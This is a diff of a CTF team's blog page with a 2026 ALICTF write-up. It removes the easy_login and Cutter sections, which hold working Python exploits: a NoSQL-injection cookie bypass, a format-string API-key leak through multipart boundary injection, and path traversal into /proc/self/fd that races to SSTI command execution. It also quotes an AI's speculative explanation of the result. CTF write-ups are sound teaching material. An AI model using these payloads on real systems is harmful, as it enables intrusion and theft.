@@ -66,7 +66,7 @@
   "headline": "2026 ALICTF SU WriteUp",
   "description" : "本次 ALICTF 我们 SU 取得了 第十名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。\n以下是我们 SU 本次 2026 ALICTF 的 WriteUp。\n",
   "inLanguage" : "en",
-  "wordCount":  7703 ,
+  "wordCount":  8899 ,
   "datePublished" : "2026-02-02T22:24:15\u002b08:00",
   "dateModified" : "2026-02-02T22:24:15\u002b08:00",
   "image" : "http:\/\/localhost:1313\/img\/SU.jpg",
@@ -117,7 +117,7 @@
     document.documentElement.setAttribute("data-theme", theme === "light" ? "light" : "dark");
   })();
 </script>
-<link rel="stylesheet" href="/css/team-theme.css?v=20260322-7">
+<link rel="stylesheet" href="/css/team-theme.css?v=20260322-8">
 
   </head>
   <body>
@@ -316,10 +316,10 @@
   <i class="fas fa-calendar"></i>&nbsp;Posted on February 2, 2026
   
   
-    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;37&nbsp;min
+    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;42&nbsp;min
   
   
-    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;7703&nbsp;words
+    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;8899&nbsp;words
   
   
     
@@ -363,9 +363,9 @@
             <li><a href="#stage-3--获取flag">Stage 3:  获取FLAG</a></li>
           </ul>
         </li>
-        <li><a href="#easy_login">easy_login</a></li>
-        <li><a href="#cutter">Cutter</a></li>
         <li><a href="#backup-exec">Backup Exec</a></li>
+        <li><a href="#easy-login">Easy Login</a></li>
+        <li><a href="#cutter">cutter</a></li>
       </ul>
     </li>
     <li><a href="#misc">Misc</a>
@@ -930,240 +930,7 @@
 <li><a href="https://github.com/X1r0z/JNDIMap">JNDIMap</a></li>
 <li><a href="https://www.bilibili.com/video/BV1AZmEBVEsU/?share_source=copy_web&amp;vd_source=8c76f8e232993e8e3083ed467fe773f7">NIKO15次梦碎Major</a>、<a href="https://www.bilibili.com/video/BV1GEm9BoEnq/?spm_id_from=333.337.search-card.all.click&amp;vd_source=6870219ddced853e80ae239d5319e97c">😭一生只哭18次😭</a>、<a href="https://www.bilibili.com/video/BV15Y4y117sn/?share_source=copy_web&amp;vd_source=8c76f8e232993e8e3083ed467fe773f7">【活着】“所以生命啊，它苦涩如歌”</a></li>
 </ol>
-<h2 id="easy_login">easy_login</h2>
-<p>通过审计 src/server.ts，可以发现</p>
-<p>admin 用户会随机生成一个长字符串密码</p>
-<p><img src="/img/2026-alictf/15.png" alt="img"></p>
-<p>Flag 在 /admin 接口中返回，该接口要求当前登录用户必须是 admin</p>
-<p><img src="/img/2026-alictf/16.png" alt="img"></p>
-<p>使用 cookie-parser 解析 Cookie，并将解析出的 sid 直接给数据库查询</p>
-<p><img src="/img/2026-alictf/17.png" alt="img"></p>
-<p>在 sessionMiddleware 中以下代码存在nosql注入</p>
-<p><img src="/img/2026-alictf/18.png" alt="img"></p>
-<p>当 Cookie 以 j: 开头时，cookie-parser 会尝试将其解析为 JSON 对象。如果我们将 sid 设置为 {&quot;$ne&quot;: &ldquo;random_value&rdquo;}，查询语句将变为 db.sessions.findOne({ sid: { &ldquo;$ne&rdquo;: &ldquo;random_value&rdquo; } })</p>
-<p>所以我们可以通过 /visit 接口，利用应用内部的 Bot 自动进行管理员登录。这将导致数据库中产生一个admin 用户的 Session，再使用 NoSQL 注入绕过 sid 的精确匹配。设置Cookie 为sid=j:{&quot;$ne&quot;: &ldquo;anything&rdquo;} 访问 /admin，就可以绕过鉴权</p>
-<p>exp</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;http://223.6.249.127:12106&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 第一步：唤醒 Bot 登录，产生 Admin Session</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Waking up the bot...&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/visit&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;url&#34;</span><span class="p">:</span> <span class="s2">&#34;http://example.com&#34;</span><span class="p">})</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 第二步：使用 NoSQL 注入 Cookie 劫持 Admin 权限</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Exploiting NoSQL Injection...&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="c1"># &#39;j:&#39; 前缀触发 cookie-parser 的 JSON 解析逻辑</span>
-</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sid&#34;</span><span class="p">:</span> <span class="s1">&#39;j:{&#34;$ne&#34;: &#34;null&#34;}&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/admin&#34;</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Server Response:&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-</span></span></code></pre></div><p>flag</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">alictf{0c6b7a19-8a74-4129-8dc8-913e98cad823}
-</span></span></code></pre></div><h2 id="cutter">Cutter</h2>
-<p>审计代码可以发现admin路由下存在可以利用的一些点</p>
-<p><img src="/img/2026-alictf/19.png" alt="img"></p>
-<p>path.join<code>拼接</code>tmpl<code>参数时没有过滤</code>..`，导致路径穿越和任意文件读取</p>
-<p>读取的文件内容直接通过 <code>render_template_string</code> 渲染。如果我们能控制被读取的文件内容，就能实现 SSTI</p>
-<p>但是这里存在一个问题就是需要API_KEY才能实现</p>
-<p>还有action路由下存在格式化字符串漏洞可以利用</p>
-<p><img src="/img/2026-alictf/20.png" alt="img"></p>
-<p>在 <code>debug</code> 模式下，允许通过 <code>content.format(app)</code> 泄露对象属性。这可以用来泄露全局变量中的 <code>API_KEY</code></p>
-<p>heartbeat路由</p>
-<p><img src="/img/2026-alictf/21.png" alt="img"></p>
-<p>可以发现我们可以通过请求参数控制任意的 <code>headers，</code>可以注入 <code>Content-Type</code> 来改变 <code>httpx</code> 发往由 <code>/action</code> 接收的数据包的结构</p>
-<p><code>/heartbeat</code> 硬编码了 <code>action</code> 类型为 <code>echo</code>，无法直接触发 <code>/action</code> 的 <code>debug</code> 模式。但通过注入 <code>Content-Type</code> 头部，我们可以劫持数据包，设置 <code>client=Content-Type</code>和<code>token=multipart/form-data; boundary=HACKER</code>，在 <code>text</code> 字段中构造包含 <code>{&quot;type&quot;: &quot;debug&quot;}</code> 的 <code>action</code> 部分</p>
-<p>这样当 <code>/action</code> 收到请求时，它会优先使用我们注入的 <code>HACKER</code> 作为 Boundary。后端会读取我们在 <code>text</code> 中构造的第二个 <code>action</code> 字段，从而覆盖掉原始的 <code>echo</code></p>
-<p>泄漏 Payload:<code>{0.view_functions[index].globals[API_KEY]}</code></p>
-<p>可以得到<code>API_KEY = 911ec63d10f2bd607080ca3ff396a647699de5159e13f99c615e03fd9aa2a806</code></p>
-<p>拿到了 <code>API_KEY</code> 后，我们可以访问 <code>/admin</code>。虽然可以 LFI 读文件，但是我们不知道flag的具体文件名。</p>
-<p><img src="/img/2026-alictf/22.png" alt="img"></p>
-<p>在 Linux 中，<code>/proc/self/fd/</code> 包含了进程当前打开的所有文件描述符。FD 3通常是服务器监听的 Socket。FD 4-10: 通常是当前正在处理请求的输入流（<code>wsgi.input</code>）或者因请求体过大而产生的临时缓存文件。</p>
-<p>所以如果我们包含正在读取我们请求体的那个 FD，<code>/admin</code> 就会读取我们发送的内容。</p>
-<p>让ai写了个FD条件竞争的脚本</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">TARGET_IP</span> <span class="o">=</span> <span class="s2">&#34;223.6.249.127&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">TARGET_PORT</span> <span class="o">=</span> <span class="s2">&#34;34696&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">BASE_URL</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">TARGET_IP</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">TARGET_PORT</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">API_KEY</span> <span class="o">=</span> <span class="s2">&#34;911ec63d10f2bd607080ca3ff396a647699de5159e13f99c615e03fd9aa2a806&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">trigger_upload</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Starting large upload to /heartbeat...&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="c1"># Payload: list root directory</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ssti</span> <span class="o">=</span> <span class="s2">&#34;{{ config.class.init.globals[&#39;os&#39;].listdir(&#39;/&#39;) }}&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">padding</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">600000</span><span class="p">)</span> <span class="c1"># 600KB padding to ensure it goes to disk</span>
-</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">ssti</span> <span class="o">+</span> <span class="n">padding</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># We use a long timeout to keep the connection open as long as possible</span>
-</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/heartbeat&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;text&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[] Upload finished with status </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[] Upload error (expected if we block): </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">brute_fd_ssti</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># Wait for upload to start and potentially hit /action</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Starting FD brute force on /admin...&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="n">API_KEY</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">25</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="c1"># We hit /admin which will read the FD</span>
-</span></span><span class="line"><span class="cl">            <span class="c1"># If the FD is the temp file, it will render our SSTI</span>
-</span></span><span class="line"><span class="cl">            <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;tmpl&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;../../../../proc/self/fd/</span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/admin&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s2">&#34;[&#39;&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="s2">&#34;flag&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[!!!] SUCCESS! Found listing on FD </span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s2">:&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">True</span>
-</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;FD </span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s2"> returned 200 but no flag listing. Snippet: </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">Run</span> <span class="n">upload</span> <span class="ow">in</span> <span class="n">background</span>
-</span></span><span class="line"><span class="cl"><span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">trigger_upload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">Brute</span> <span class="n">force</span> <span class="n">FDs</span>
-</span></span><span class="line"><span class="cl"><span class="n">brute_fd_ssti</span><span class="p">()</span>
-</span></span></code></pre></div><ol>
-<li>由一个线程向 <code>/heartbeat</code> 发送超大请求（几百 KB 的填充数据），目的是让 Werkzeug 将请求体写入磁盘上的临时文件。</li>
-<li>主线程同时在 <code>/admin</code> 上循环尝试读取各显 FD（如 <code>/proc/self/fd/6</code>）。</li>
-</ol>
-<p>运行脚本的目标不是直接读 Flag 文件，而是希望 FD 里面是我们发送的 SSTI Payload <code>{{ config...os.listdir('/') }}</code>，从而让我们执行命令去寻找 Flag。</p>
-<p>结果在进行到Step 1147的时候收到了如下响应： <code>FD 6 returned 200 but no flag listing. Snippet: alictf{301e7a69...}</code></p>
-<p>ai分析原因：</p>
-<ol>
-<li>残存数据 (Residual Buffers): 服务器是多线程的。在之前的格式化字符串攻击中，我们可能已经通过 format(app) 引起了某些包含了 flag 或者系统环境信息的变量被输出到了某个内部缓冲区。</li>
-<li>异步连接泄露: 当我们通过 /admin 包含正在处理的 Socket FD 时，我们读取的是该 FD 对应的 内核级缓冲区 (Kernel Buffer)。如果这个时候服务器刚刚处理完一个含有泄露信息的请求，或者正在处理带有敏感数据的其他内部请求，通过 LFI 读取 FD 会直接捕获到这些“尚未清除”的原始数据。</li>
-<li>内存映射: 在某些 Python 版本中，render_template_string 的处理逻辑结合 Werkzeug 对 wsgi.input 的处理，在极端高并发的情况下，FD 可能会指向一个被重置前留有前一个请求内容的内存页。</li>
-</ol>
-<p>简单来说：我们像是在服务器的数据交换管道里插了一根吸管（通过读取 FD），本来想吸出自己的 Payload，结果顺带吸出了前序攻击或系统处理中残存在管道里的 Flag。</p>
-<p>exp</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># --- Configuration ---</span>
-</span></span><span class="line"><span class="cl"><span class="n">TARGET_URL</span> <span class="o">=</span> <span class="s2">&#34;http://223.6.249.127:34696&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leak_api_key</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Stage 1: Leaking API_KEY via Format String &amp; Boundary Injection...&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="c1"># Payload to leak the API_KEY variable from app&#39;s global scope</span>
-</span></span><span class="line"><span class="cl">    <span class="c1"># index is the view function name, which is &#39;action&#39; or &#39;heartbeat&#39; in this context</span>
-</span></span><span class="line"><span class="cl">    <span class="n">payload_str</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">{0.view_functions[index].__globals__[API_KEY]}</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="n">MY_BOUNDARY</span> <span class="o">=</span> <span class="s2">&#34;AaB03x&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="c1"># We inject a fake multipart body inside the &#39;text&#39; field to override the &#39;action&#39; part</span>
-</span></span><span class="line"><span class="cl">    <span class="n">inner_payload</span> <span class="o">=</span> <span class="p">(</span>
-</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">payload_str</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;--</span><span class="si">{</span><span class="n">MY_BOUNDARY</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Disposition: form-data; name=&#34;action&#34;; filename=&#34;action.json&#34;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;{&#34;type&#34;: &#34;debug&#34;}</span><span class="se">\r\n</span><span class="s1">&#39;</span>
-</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;--</span><span class="si">{</span><span class="n">MY_BOUNDARY</span><span class="si">}</span><span class="s2">--</span><span class="se">\r\n</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">)</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;client&#34;</span><span class="p">:</span> <span class="s2">&#34;content-type&#34;</span><span class="p">,</span> <span class="c1"># Header Injection: Control Content-Type</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;multipart/form-data; boundary=</span><span class="si">{</span><span class="n">MY_BOUNDARY</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="c1"># Set our custom boundary</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;text&#34;</span><span class="p">:</span> <span class="n">inner_payload</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET_URL</span><span class="si">}</span><span class="s2">/heartbeat&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="c1"># The API_KEY is a 64-char hex string (os.urandom(32).hex())</span>
-</span></span><span class="line"><span class="cl">            <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;([a-f0-9]</span><span class="si">{64}</span><span class="s2">)&#34;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="k">match</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="n">api_key</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Found API_KEY: </span><span class="si">{</span><span class="n">api_key</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">api_key</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[-] Error leaking API_KEY: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_flag_filename</span><span class="p">(</span><span class="n">api_key</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Stage 2: Finding Flag filename via LFI -&gt; SSTI Race Condition...&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="n">ssti_payload</span> <span class="o">=</span> <span class="s2">&#34;{{ config.__class__.__init__.__globals__[&#39;os&#39;].listdir(&#39;/&#39;) }}&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">stop_event</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">spammer</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="ow">not</span> <span class="n">stop_event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="c1"># Keep sending the SSTI payload to fill socket buffers</span>
-</span></span><span class="line"><span class="cl">                <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET_URL</span><span class="si">}</span><span class="s2">/heartbeat&#34;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;text&#34;</span><span class="p">:</span> <span class="n">ssti_payload</span><span class="p">},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="k">except</span><span class="p">:</span> <span class="k">pass</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># Start background spammers</span>
-</span></span><span class="line"><span class="cl">    <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">spammer</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span>
-</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">        <span class="n">threads</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="n">api_key</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="n">flag_file</span> <span class="o">=</span> <span class="kc">None</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Hunting for payload in /proc/self/fd/...&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span> <span class="o">&lt;</span> <span class="mi">60</span><span class="p">:</span> <span class="c1"># 1 minute timeout</span>
-</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">15</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="c1"># LFI into the procfs FD to read our own incoming request and render it as a template</span>
